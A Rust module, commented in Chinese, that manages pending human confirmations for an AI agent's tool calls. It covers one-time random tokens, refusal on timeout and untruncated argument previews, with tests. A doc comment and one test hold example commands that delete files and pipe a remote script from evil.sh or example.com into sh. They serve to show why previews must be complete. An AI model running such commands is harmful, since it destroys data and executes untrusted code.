//! 工具确认回路的宿主一半 —— 「agent 问、客户端答」里的那本待办簿。
//!
//! # 为什么在这里，而不在 `cortex-proto` 或 `cortex-agent`
//!
//! 它曾经在 `cortex-proto`，理由是「`GET /confirmations` 的响应体就是
//! `PendingInfo`」。但那句话只覆盖那个**线上类型**（它还留在那儿，与
//! `ChatEvent::Confirm` 做邻居），覆盖不了这本簿子 —— 簿子是运行时，
//! 而它把整个 `cortex-agent` 拖进了线协议 crate，挡着记忆那一层独立开源。
//!
//! 也没放进 `cortex-agent`：那是 agent 循环与工具的库，**不该知道 HTTP**。
//! 簿子要往 SSE 流上发事件、要认 HTTP 回执、要按 token 一次性消费 ——
//! 那是宿主的活。而宿主只剩一个：这个进程。cortexd 不跑 agent，
//! 容器里那个不问确认（越界路径直接拒绝）。
//!
//! ```text
//! agent 循环                  ConfirmRegistry              客户端
//!    │                              │                        │
//!    │ host.confirm(req) ──► open() │                        │
//!    │                              │ 登记 token             │
//!    │ ◄── token ───────────────────┤                        │
//!    │ SSE: ChatEvent::Confirm ─────┼───────────────────────►│
//!    │ (挂起 await) ────────────────┤                        │
//!    │                              │◄── POST /confirmations ┤
//!    │ ◄── Approval ────────────────┤   （token + 决定）      │
//!    │ 继续执行 / 回绝给模型         │  移除 token（一次性）   │
//! ```
//!
//! # 为什么不落库
//!
//! 待确认项是**活着的一轮对话的一部分**：进程一重启，那一轮的 agent 循环、
//! 它的模型上下文、它挂起的 future 全都没了，此时一条「还没答的确认」
//! 在数据库里就是一条永远等不到人的死记录。而在 append-only 体系里，
//! 一条写下去就删不掉的死记录比不写更糟。
//!
//! 审计需要的东西照样有：批准与否体现在 `episode_tool_calls` 的 `ok` 与
//! `summary` 上（被拒的调用留下 `ok=false` 与拒绝理由），那才是回放时
//! 真正要看的一行。
//!
//! # 谁能回答（多端）
//!
//! 答复走的是**这本共享簿子**，不是发起那条 SSE 连接。所以任何一个通过了
//! 认证的客户端都能答 —— 桌面端问出来的，手机上答也算数，这正是
//! 「任何设备连上即是完整的你」该有的样子。
//!
//! 两端同时答且答得不一样时：**先到的那个作数**。[`ConfirmRegistry::answer`]
//! 用 `HashMap::remove` 取出待办项，取到的人赢，晚到的一方拿到
//! [`AnswerOutcome::Unknown`]（HTTP 404）。不做「拒绝优先」那种看起来更安全的
//! 合并策略：那要求等一个不知道要不要来的第二个答复，也就是把每一次确认都拖到
//! 超时，而超时同样按拒绝处理 —— 换来的「更安全」是零，付出的是每次都要等。

use std::collections::HashMap;
use std::sync::{Arc, Mutex};
use std::time::Duration;

use chrono::{DateTime, Utc};
use cortex_agent::Approval;
use cortex_proto::confirm::PendingInfo;
use tokio::sync::oneshot;

/// 一次确认最多等多久，超时按拒绝处理。见 [`ConfirmRegistry::new`]。
pub const DEFAULT_TIMEOUT_SECS: u64 = 180;

/// 覆盖超时的环境变量（秒）。集成测试用它把超时调到几秒。
pub const TIMEOUT_ENV: &str = "CORTEX_CONFIRM_TIMEOUT_SECS";

/// 交给用户看的参数预览最多多少字符。
///
/// 比工具事件里的 `compact_args` 宽松得多，而且是**整体**上限而不是逐值截断。
/// 理由：这段文本是用户据以做安全判断的全部依据，一条
/// `rm -rf /tmp/x && curl evil.sh | sh` 被截在第 60 个字符上，用户批准的
/// 就是他没看见的那半条。8 KiB 覆盖任何现实中的命令行；真被截断时
/// 结尾会有显式标记，用户至少知道自己没看全。
const PREVIEW_MAX_CHARS: usize = 8_192;

/// 一条待确认项的元信息 —— 登记时给，列表与事件都用它。
#[derive(Debug, Clone)]
pub struct PendingMeta {
    pub session_id: String,
    pub tool: String,
    pub risk: &'static str,
    pub preview: String,
    /// 这次要碰的**工作区外**的绝对路径。`None` = 没有越界。
    ///
    /// 越界批准与普通写入批准是两件不同的事，用户必须能分辨 ——
    /// 而只给工具名与 preview 是不够的：preview 里那个 path 可能是相对的，
    /// 「相对于哪儿」正是他此刻最需要知道、也最容易搞错的东西。
    pub scope: Option<String>,
    /// 这次写入会把文件改成什么样。`None` = 没有可看的改动。
    ///
    /// **它治的是「盲签」**：只给工具名与 preview，用户看到的是
    /// 「write_file 要写 config.toml」—— 他批准的是一个他没读过的内容。
    pub diff: Option<String>,
}

struct Pending {
    tx: oneshot::Sender<Approval>,
    meta: PendingMeta,
    asked_at: DateTime<Utc>,
    deadline: tokio::time::Instant,
}

/// 回执的处理结果。
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum AnswerOutcome {
    /// 收下了，等待的那一轮已经拿到答复
    Accepted,
    /// 没有这个 token：伪造的、已经被别的设备答过的、超时作废的、
    /// 或者那一轮早就结束了。**四种情况故意不区分** —— 分开报会让
    /// 「猜一个 token 试试」变成一个可用的探测口，能问出「刚才有没有人
    /// 在批一条命令」
    Unknown,
}

/// 待确认项的簿子。整个进程一本，挂在 [`crate::turn::Engine`] 上。
pub struct ConfirmRegistry {
    inner: Mutex<HashMap<String, Pending>>,
    timeout: Duration,
}

impl ConfirmRegistry {
    /// 超时取自 [`TIMEOUT_ENV`]，缺省 [`DEFAULT_TIMEOUT_SECS`]。
    ///
    /// # 超时后是放行还是拒绝 —— 拒绝
    ///
    /// 没人回答意味着**没人看见**：页面关了、网断了、客户端崩了。
    /// 两个方向的错误代价完全不对称：
    ///
    /// - 超时放行 → 关掉笔记本盖子就等于把 shell 交出去，而且不会有任何
    ///   痕迹告诉用户「你不在的时候批准了一条命令」。这是**不可挽回**的：
    ///   命令已经跑完了。
    /// - 超时拒绝 → 模型收到一句「没人回答」，换条只读的路或者收口告诉用户
    ///   卡在哪。用户回来重发一句就是了。这是**可挽回**的。
    ///
    /// 取值取不出数时报错而不是悄悄用默认值：把超时配成 `abc` 却照跑，
    /// 等于安全边界失效而运维完全不知情（与 `CORTEX_AGENT_MAX_ROUNDS`
    /// 的处理一致）。
    pub fn from_env() -> cortex_core::Result<Self> {
        let secs = match std::env::var(TIMEOUT_ENV) {
            Ok(v) => v.trim().parse::<u64>().map_err(|_| {
                cortex_core::CortexError::Config(format!(
                    "{TIMEOUT_ENV} 必须是正整数秒，实际是 {v:?}"
                ))
            })?,
            Err(_) => DEFAULT_TIMEOUT_SECS,
        };
        if secs == 0 {
            return Err(cortex_core::CortexError::Config(format!(
                "{TIMEOUT_ENV} 不能是 0 —— 那等于「高风险工具一律拒绝」，\
                 想要那个效果请不要接确认通道，而不是把超时配成 0"
            )));
        }
        Ok(Self::new(Duration::from_secs(secs)))
    }

    #[must_use]
    pub fn new(timeout: Duration) -> Self {
        Self {
            inner: Mutex::new(HashMap::new()),
            timeout,
        }
    }

    #[must_use]
    pub fn timeout(&self) -> Duration {
        self.timeout
    }

    /// 登记一条待确认项，拿到凭据与等待句柄。
    ///
    /// **先登记再发事件**，顺序不能反：反过来的话，一个手快的客户端
    /// （或者本机 loopback 上几乎零延迟的 CLI）可能在登记完成之前就把回执
    /// 打回来，那条回执会撞上一个还不存在的 token 被判为伪造，
    /// 而那一轮则继续傻等到超时。这个竞态在慢网络上永远复现不出来。
    pub fn open(self: &Arc<Self>, meta: PendingMeta) -> PendingConfirm {
        let token = mint_token();
        let (tx, rx) = oneshot::channel();
        let pending = Pending {
            tx,
            meta,
            asked_at: Utc::now(),
            deadline: tokio::time::Instant::now() + self.timeout,
        };
        self.inner
            .lock()
            .expect("确认簿的锁不该中毒")
            .insert(token.clone(), pending);
        PendingConfirm {
            token,
            rx: Some(rx),
            registry: Arc::clone(self),
        }
    }

    /// 处理一条回执。
    pub fn answer(&self, token: &str, approval: Approval) -> AnswerOutcome {
        // remove 而非 get：**一次性**。取到的人赢，这既实现了「先到作数」，
        // 也让同一个 token 无法被重放去批准第二次调用
        let Some(pending) = self.inner.lock().expect("确认簿的锁不该中毒").remove(token)
        else {
            return AnswerOutcome::Unknown;
        };
        // 接收端已经走了（那一轮超时了或者断了）。对回执方来说这与
        // 「没有这个 token」是同一件事：他的答复没有起作用
        if pending.tx.send(approval).is_err() {
            return AnswerOutcome::Unknown;
        }
        tracing::info!(
            tool = %pending.meta.tool,
            session = %pending.meta.session_id,
            ?approval,
            "收到工具确认回执"
        );
        AnswerOutcome::Accepted
    }

    /// 当前还在等的确认项。
    ///
    /// 这是**断线重连的答案**：SSE 一断，那条流上的确认请求事件就再也不会
    /// 重发（POST /chat 的流是一次性的，没有 Last-Event-ID 重放）。重连后的
    /// 客户端拉一次这个端点就知道「有没有什么还等着我批」。同一个端点也是
    /// 第二台设备发现待办项的唯一途径 —— 确认请求刻意**不**走 `/ws` 广播：
    /// 那条通道的契约是「只推信号不推数据」（见 [`crate::dto::SyncEvent`]），
    /// 为一个活不过进程重启的东西破例，会把那条契约上的三条理由全部作废。
    pub fn pending(&self, session_id: Option<&str>) -> Vec<PendingInfo> {
        let now = tokio::time::Instant::now();
        let guard = self.inner.lock().expect("确认簿的锁不该中毒");
        let mut out: Vec<PendingInfo> = guard
            .iter()
            .filter(|(_, p)| session_id.is_none_or(|s| p.meta.session_id == s))
            .map(|(token, p)| PendingInfo {
                token: token.clone(),
                session_id: p.meta.session_id.clone(),
                tool: p.meta.tool.clone(),
                risk: p.meta.risk.to_string(),
                preview: p.meta.preview.clone(),
                asked_at: p.asked_at.to_rfc3339(),
                expires_in_secs: p.deadline.saturating_duration_since(now).as_secs(),
                scope: p.meta.scope.clone(),
                diff: p.meta.diff.clone(),
            })
            .collect();
        // 稳定顺序：先问的排前面。HashMap 的迭代序每次都不一样，
        // 客户端列表会随机重排
        out.sort_by(|a, b| a.asked_at.cmp(&b.asked_at));
        out
    }

    fn forget(&self, token: &str) {
        self.inner.lock().expect("确认簿的锁不该中毒").remove(token);
    }

    #[cfg(test)]
    fn len(&self) -> usize {
        self.inner.lock().expect("确认簿的锁不该中毒").len()
    }
}

/// 一条已登记、等着被回答的确认项。
///
/// `Drop` 时把自己从簿子上划掉：无论等待方是超时了、被取消了还是 panic 了，
/// 待办项都不会留在簿子上变成一条永远列得出来却没人在等的幽灵记录。
pub struct PendingConfirm {
    token: String,
    rx: Option<oneshot::Receiver<Approval>>,
    registry: Arc<ConfirmRegistry>,
}

impl PendingConfirm {
    #[must_use]
    pub fn token(&self) -> &str {
        &self.token
    }

    /// 等一个答复。三条路先到先算：回执、客户端断开、超时。
    ///
    /// `cancelled` 是「发起这一轮的客户端已经走了」的信号。它不是可有可无的
    /// 优化：确认期间 agent 循环不发任何事件，因此**已有的那套「send 失败即
    /// 客户端断开」的探测在这段时间里完全失灵**，没有它，关掉页面之后那一轮
    /// 会原地挂满整个超时，期间占着一个数据库连接和一份模型上下文。
    pub async fn wait<C>(mut self, cancelled: C) -> Approval
    where
        C: std::future::Future<Output = ()> + Send,
    {
        let rx = self.rx.take().expect("wait 只会被调用一次");
        let timeout = self.registry.timeout;
        tokio::select! {
            // biased：三条路同时就绪时优先认回执。用户按了「允许」的同一毫秒
            // 里超时也到了，认回执更符合他看到的事实
            biased;
            answer = rx => answer.unwrap_or(Approval::Unanswered),
            () = cancelled => {
                tracing::info!(token = %self.token, "确认期间客户端断开，按未应答处理");
                Approval::Unanswered
            }
            () = tokio::time::sleep(timeout) => {
                tracing::warn!(
                    token = %self.token,
                    secs = timeout.as_secs(),
                    "工具确认超时，按拒绝处理"
                );
                Approval::Unanswered
            }
        }
    }
}

impl Drop for PendingConfirm {
    fn drop(&mut self) {
        self.registry.forget(&self.token);
    }
}

/// 铸一个回执凭据。
///
/// # 为什么不能用工具调用的 id
///
/// 模型给的 `tool_call_id` 是可预测的（`call_0`、`call_1`、`toolu_…`），
/// 而且**它出自模型**，也就是出自那个被权限闸门防着的一侧。用它当凭据等于
/// 让任何猜得到形状的人替用户批准一次 shell 执行。
///
/// # 256 位，直接来自内核 CSPRNG
///
/// 不用 ULID：它的高 48 位是毫秒时间戳，是可预测的，随机位只有 80。
/// 猜中一个活着的 token 需要的不只是熵，还得赶在它作废之前 —— 但把安全性
/// 建立在「窗口很短」上是把两个独立的保护合成了一个。`getrandom` 直接走
/// `getrandom(2)` / `BCryptGenRandom`，没有用户态 RNG 状态可议。
///
/// 凭据本身仍然只是**第二道**闸：回执端点在认证之后（见 [`crate::auth`]），
/// 未认证的请求根本到不了这里。两道都要有 —— 认证挡的是「你是谁」，
/// 凭据挡的是「已登录的这个会话能不能替另一次调用作答」。
fn mint_token() -> String {
    let mut buf = [0u8; 32];
    // 内核熵源取不到是系统级故障（Linux 上 getrandom(2) 除了被信号打断
    // 几乎不会失败）。此时 panic 优于回落到可预测的东西：一个「看起来在工作
    // 但凭据可猜」的确认回路，比一个当场崩掉的服务危险得多
    getrandom::fill(&mut buf).expect("内核熵源不可用，拒绝铸造可预测的确认凭据");
    hex::encode(buf)
}

/// 把工具参数渲染成给人看的预览。
///
/// 与 cortexd 的 `live::compact_args` 分开的两个函数，因为它们服务两件不同的事：
/// 那个是给 UI 画一行「动了哪个文件」的摘要，逐值截到 60 字符；这个是用户
/// 据以做安全判断的全部依据，**不能**逐值截断（截掉的正好是命令危险的那一半）。
/// 合成一个函数就必然要在两种需求里选一个，而选哪个都会在另一处出问题。
#[must_use]
pub fn preview_of(arguments: &serde_json::Value) -> String {
    let rendered = match arguments.as_object() {
        // 逐行 `键: 值`，而不是压成一行 JSON：用户要读的是命令本身，
        // 转义过的 JSON 字符串里 `\"` 和 `\n` 会把一条命令读成另一条
        Some(obj) => obj
            .iter()
            .map(|(k, v)| {
                let raw = v
                    .as_str()
                    .map_or_else(|| v.to_string(), std::string::ToString::to_string);
                format!("{k}: {raw}")
            })
            .collect::<Vec<_>>()
            .join("\n"),
        None => arguments.to_string(),
    };

    if rendered.chars().count() <= PREVIEW_MAX_CHARS {
        return rendered;
    }
    let head: String = rendered.chars().take(PREVIEW_MAX_CHARS).collect();
    format!(
        "{head}\n…（参数过长已截断，共 {} 字符；未显示的部分同样会被执行）",
        rendered.chars().count()
    )
}

#[cfg(test)]
mod tests {
    use super::*;

    fn meta() -> PendingMeta {
        PendingMeta {
            session_id: "s1".into(),
            tool: "shell".into(),
            risk: "execute",
            preview: "command=echo hi".into(),
            scope: None,
            diff: None,
        }
    }

    fn registry(secs: u64) -> Arc<ConfirmRegistry> {
        Arc::new(ConfirmRegistry::new(Duration::from_secs(secs)))
    }

    #[tokio::test]
    async fn an_answer_reaches_the_waiting_turn() {
        let reg = registry(30);
        let p = reg.open(meta());
        let token = p.token().to_string();
        let reg2 = Arc::clone(&reg);
        tokio::spawn(async move {
            assert_eq!(
                reg2.answer(&token, Approval::Allow),
                AnswerOutcome::Accepted
            );
        });
        assert_eq!(p.wait(std::future::pending()).await, Approval::Allow);
    }

    #[tokio::test]
    async fn a_denial_reaches_the_waiting_turn() {
        let reg = registry(30);
        let p = reg.open(meta());
        reg.answer(p.token(), Approval::Denied);
        assert_eq!(p.wait(std::future::pending()).await, Approval::Denied);
    }

    /// 超时必须是**拒绝**，不是放行。这条断言守的是本模块最重要的一个决定。
    #[tokio::test(start_paused = true)]
    async fn silence_is_a_refusal_not_an_approval() {
        let reg = registry(2);
        let p = reg.open(meta());
        let got = p.wait(std::future::pending()).await;
        assert_eq!(
            got,
            Approval::Unanswered,
            "没人回答时必须按拒绝处理 —— 放行意味着关掉页面就等于交出 shell"
        );
    }

    #[tokio::test]
    async fn a_disconnected_client_ends_the_wait_immediately() {
        let reg = registry(3600); // 超时长到不可能是它救的场
        let p = reg.open(meta());
        let got = p.wait(std::future::ready(())).await;
        assert_eq!(got, Approval::Unanswered);
    }

    /// 一个 token 只能用一次 —— 重放不能批准第二次调用。
    #[tokio::test]
    async fn a_token_is_consumed_by_the_first_answer() {
        let reg = registry(30);
        let p = reg.open(meta());
        let token = p.token().to_string();
        assert_eq!(reg.answer(&token, Approval::Allow), AnswerOutcome::Accepted);
        assert_eq!(
            reg.answer(&token, Approval::Allow),
            AnswerOutcome::Unknown,
            "同一个凭据不能批准第二次"
        );
    }

    /// 多端同时答：先到的作数，晚到的拿到 Unknown 而不是静默成功。
    #[tokio::test]
    async fn the_first_device_to_answer_wins() {
        let reg = registry(30);
        let p = reg.open(meta());
        let token = p.token().to_string();
        let first = reg.answer(&token, Approval::Denied);
        let second = reg.answer(&token, Approval::Allow);
        assert_eq!(first, AnswerOutcome::Accepted);
        assert_eq!(
            second,
            AnswerOutcome::Unknown,
            "第二台设备必须知道自己的答复没有生效，而不是以为批准了"
        );
        assert_eq!(
            p.wait(std::future::pending()).await,
            Approval::Denied,
            "生效的应当是先到的那个答复"
        );
    }

    #[tokio::test]
    async fn a_forged_token_is_indistinguishable_from_an_expired_one() {
        let reg = registry(30);
        assert_eq!(
            reg.answer("deadbeef", Approval::Allow),
            AnswerOutcome::Unknown
        );
    }

    /// 等待结束后待办项必须从簿子上消失，否则列表里会堆满没人在等的幽灵。
    #[tokio::test(start_paused = true)]
    async fn a_finished_wait_leaves_no_ghost_entry() {
        let reg = registry(1);
        {
            let p = reg.open(meta());
            assert_eq!(reg.len(), 1);
            assert_eq!(reg.pending(None).len(), 1);
            assert_eq!(reg.pending(Some("别的会话")).len(), 0, "应当能按会话过滤");
            let _ = p.wait(std::future::pending()).await;
        }
        assert_eq!(reg.len(), 0, "超时之后待办项必须被划掉");
    }

    #[tokio::test]
    async fn pending_lists_what_a_reconnecting_client_needs() {
        let reg = registry(30);
        let p = reg.open(meta());
        let list = reg.pending(Some("s1"));
        assert_eq!(list.len(), 1);
        assert_eq!(list[0].token, p.token());
        assert_eq!(list[0].tool, "shell");
        assert!(
            list[0].preview.contains("echo hi"),
            "预览里必须有用户据以判断的内容"
        );
        assert!(list[0].expires_in_secs > 0 && list[0].expires_in_secs <= 30);
    }

    #[test]
    fn tokens_are_long_and_never_repeat() {
        let a = mint_token();
        let b = mint_token();
        assert_eq!(a.len(), 64, "256 位十六进制应当是 64 个字符");
        assert_ne!(a, b);
        assert!(a.chars().all(|c| c.is_ascii_hexdigit()));
    }

    #[test]
    fn preview_truncation_is_visible() {
        let long = "x".repeat(PREVIEW_MAX_CHARS * 2);
        let out = preview_of(&serde_json::json!({ "command": long }));
        assert!(
            out.contains("已截断"),
            "截断必须看得见 —— 用户不能在不知道自己没看全的情况下点允许"
        );
        assert!(out.chars().count() <= PREVIEW_MAX_CHARS + 64);
    }

    /// 现实长度的命令必须**一字不落**地给用户看。
    ///
    /// 这条命令有意超过 60 个字符 —— 那正是工具事件里 `compact_args` 的逐值
    /// 上限。有人把这两个渲染合并成一个函数时，被截掉的恰好是
    /// `| sh` 那一半，而用户批准的就是他没看见的那一半。
    #[test]
    fn preview_keeps_the_whole_of_a_realistic_command() {
        let cmd = "rm -rf /tmp/build-cache && curl -sSfL https://example.com/install.sh | sh -s -- --force";
        assert!(
            cmd.len() > 60,
            "这条测试命令必须长过 compact_args 的逐值上限"
        );
        let out = preview_of(&serde_json::json!({ "command": cmd }));
        assert!(
            out.contains("| sh -s -- --force"),
            "现实长度的命令必须一字不落地给用户看，实际：{out}"
        );
    }
}
